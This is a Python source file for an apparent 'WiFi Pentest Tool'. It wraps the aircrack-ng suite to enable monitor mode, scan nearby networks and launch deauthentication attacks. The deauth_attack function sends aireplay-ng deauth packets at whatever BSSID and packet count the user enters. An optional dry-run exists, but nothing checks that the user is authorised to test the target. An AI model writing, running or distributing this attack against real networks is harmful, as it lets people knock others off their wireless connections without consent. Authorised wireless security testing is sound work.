import subprocess
import json
from modules.utils import Colors, clear_screen

def list_interfaces():
    print(f"{Colors.CYAN}Detecting wireless interfaces...{Colors.RESET}")
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        if "IEEE 802.11" in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

def start_monitor_mode(interface):
    subprocess.run(["sudo", "airmon-ng", "start", interface])

def stop_monitor_mode(interface):
    subprocess.run(["sudo", "airmon-ng", "stop", interface])

def scan_networks(interface):
    print(f"{Colors.YELLOW}Scanning networks on {interface}... Press Ctrl+C to stop.{Colors.RESET}")
    try:
        subprocess.run(["sudo", "airodump-ng", interface])
    except KeyboardInterrupt:
        print(f"{Colors.CYAN}\nScan stopped.{Colors.RESET}")

def deauth_attack(interface, bssid, count=10, dry_run=False):
    print(f"{Colors.RED}Launching deauth attack on {bssid} (count={count}){Colors.RESET}")
    if dry_run:
        print(f"{Colors.YELLOW}[DRY-RUN] Attack simulated, no packets sent.{Colors.RESET}")
    else:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, interface])

def save_report(scan_data, filename="wifi_scan_report.json"):
    with open(filename, "w") as f:
        json.dump(scan_data, f, indent=4)
    print(f"{Colors.CYAN}Report saved as {filename}{Colors.RESET}")

def main():
    clear_screen()
    print(f"{Colors.CYAN}{Colors.BOLD}WiFi Pentest Tool{Colors.RESET}")
    
    interfaces = list_interfaces()
    if not interfaces:
        print(f"{Colors.RED}No wireless interfaces detected!{Colors.RESET}")
        return
    
    print("\nAvailable Interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")
    
    choice = input("\nSelect interface number: ").strip()
    if not choice.isdigit() or int(choice)-1 not in range(len(interfaces)):
        print(f"{Colors.RED}Invalid selection!{Colors.RESET}")
        return
    
    iface = interfaces[int(choice)-1]
    
    while True:
        print(f"\n{Colors.GREEN}Menu:{Colors.RESET}")
        print("1. Start Monitor Mode")
        print("2. Stop Monitor Mode")
        print("3. Scan Networks")
        print("4. Deauth Attack")
        print("5. Save Report")
        print("6. Exit")
        
        option = input("Select option: ").strip()
        if option == "1":
            start_monitor_mode(iface)
        elif option == "2":
            stop_monitor_mode(iface)
        elif option == "3":
            scan_networks(iface)
        elif option == "4":
            bssid = input("Enter BSSID of target: ").strip()
            count = input("Enter number of deauth packets (default 10): ").strip()
            count = int(count) if count.isdigit() else 10
            dry_run = input("Dry-run mode? (y/n): ").strip().lower() == "y"
            deauth_attack(iface, bssid, count, dry_run)
        elif option == "5":
            data = {"interface": iface, "note": "Scan logs can be added manually"}
            save_report(data)
        elif option == "6":
            print(f"{Colors.CYAN}Exiting WiFi Pentest Tool...{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}Invalid option!{Colors.RESET}")

if __name__ == "__main__":
    main()

